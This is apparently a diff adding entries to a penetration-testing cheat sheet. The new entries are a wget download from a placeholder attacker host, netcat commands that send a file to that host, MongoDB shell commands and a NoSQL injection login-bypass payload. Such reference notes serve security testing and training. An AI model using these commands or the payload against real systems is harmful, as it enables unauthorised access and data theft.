@@ -30,6 +30,20 @@ enum4linux <TARGET_IP>
 python -m SimpleHTTPServer
 ```
 
+```bash
+wget http://<ATTACKER_IP>:8000/<FILE_NAME>
+```
+
+## Netcat File Transfer
+
+```bash
+nc -lvnp 5555 > <FILE_NAME>
+```
+
+```bash
+nc <ATTACKER_IP> 5555 < <FILE_NAME>
+```
+
 ## Secure File Transfer
 
 ```bash
@@ -197,6 +211,22 @@ msfconsole
 show options
 set
 run
+```
+
+# MongoDB
+
+## Database Navigation Commands
+
+```bash
+mongo
+show dbs
+use
+```
+
+## NoSQL Injection Payloads
+
+```
+{"username":"test","password":{"$ne":""}}
 ```
 
 # Online Tools and Resources
